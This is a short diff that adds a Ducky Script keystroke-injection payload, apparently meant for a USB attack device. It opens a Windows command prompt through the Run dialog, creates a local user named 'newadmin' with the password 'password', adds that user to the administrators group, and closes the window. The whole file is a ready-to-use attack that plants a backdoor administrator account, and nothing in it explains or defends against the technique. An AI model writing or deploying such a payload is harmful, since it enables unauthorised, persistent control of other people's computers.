@@ -1,0 +1,19 @@
+REM Open Command Prompt
+GUI r
+DELAY 500
+STRING cmd
+ENTER
+DELAY 1000
+
+REM Add a new user and add it to the administrators group
+STRING net user newadmin password /add
+ENTER
+DELAY 500
+STRING net localgroup administrators newadmin /add
+ENTER
+DELAY 500
+
+REM Exit Command Prompt
+STRING exit
+ENTER
+
